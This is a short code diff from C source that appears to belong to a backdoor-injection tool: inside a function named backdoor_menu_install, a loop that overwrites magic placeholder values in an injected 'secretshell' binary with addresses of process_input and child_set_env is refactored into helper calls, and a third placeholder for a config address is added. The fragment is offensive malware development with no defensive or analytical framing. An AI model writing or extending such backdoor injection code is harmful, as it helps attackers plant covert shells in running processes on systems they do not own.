@@ -36,19 +36,9 @@ void backdoor_menu_install(inject_ctx *ctx) {
 
 	info2("entering critical phase");
 
-	// Insert return address
-	for(j = 0; j < hook_secretshell_bin_len; j++) {
-		u64 *vptr = (u64*)&evil_bin[j];
-		switch (*vptr) {
-			case 0xc0cac01ac0debabe:
-				*vptr = process_input;
-				break;
-
-			case 0x1111111122222222:
-				*vptr = child_set_env;
-				break;
-		}
-	}
+	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0xc0cac01ac0debabe, process_input);
+	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0x1111111122222222, child_set_env);
+	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0xc0debabe13371337, ctx->config_addr);
 
 	callcache = get_callcache();
 	callcache_total = get_callcachetotal();
